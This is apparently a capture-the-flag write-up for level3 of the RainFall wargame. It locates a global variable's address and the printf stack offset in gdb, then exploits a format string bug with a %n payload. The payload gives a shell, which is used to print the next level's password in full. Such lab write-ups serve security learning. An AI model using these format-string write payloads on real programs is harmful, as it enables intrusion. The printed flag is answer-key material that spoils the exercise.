## Find the addess of m to change his value

In the asm we can see `0x80484e2 <v+62>        jne    0x8048518 <v+116>`, we check

```sh
(gdb) x/s 0x804988c
0x804988c <m>:   ""
```
> yes, we got the address &m = 0x804988c

## Find the address of the buffer / printf arguement

```sh
(gdb)
AAAA
0x080484cc in v ()
(gdb) x/80x $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
0xbffff540:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff588
0xbffff550:     0x00000040      0x00000b80      0x00000000      0xb7fde714
0xbffff560:     0x00000098      0x0000000b      0x00000000      0x00000000
0xbffff570:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff580:     0x00000000      0xb7fe765d      0xb7e3ebaf      0x080482bb
0xbffff590:     0x00000000      0x00000000      0x00000000      0xb7fe749f
0xbffff5a0:     0xb7fd5000      0x00000002      0x08048268      0xb7fffc00
0xbffff5b0:     0xb7ffeff4      0xb7ffeff4      0xb7e2fc30      0x00000001
0xbffff5c0:     0xb7fdcb18      0xb7fe7cac      0x00000000      0x00000000
0xbffff5d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff5e0:     0x00000000      0xb7fdcb18      0x00000000      0x00000000
0xbffff5f0:     0x00000000      0x00000003      0xf63d4e2e      0x000003f3
0xbffff600:     0x00000000      0xb7e38938      0xb7fffe78      0xb7ff9d5c
0xbffff610:     0xb7e2fe38      0x00000000      0x00000000      0xb7e5d58d
0xbffff620:     0x00000000      0x00000000      0x00000001      0x000008b0
0xbffff630:     0xb7fdcb48      0xb7fdc858      0x080482a9      0xb7e39158
0xbffff640:     0x08048218      0x00000001      0xb7ec36c0      0xb7ec3996
(gdb) x/s $esp + 16
0xbffff520:      "AAAA\n"
```

But printf read chars to 4bites 16 / 4 = 4

```sh
level3@RainFall:~$ ./level3
%4$p
0x70243425
```
> 0x70243425 = ?p$4%, so we got it

## Exploit

```sh
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%59x' + '\%4\$n')"; cat) | ./level3
��                                                        200\
Wait what?!
ls
ls: cannot open directory .: Permission denied
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```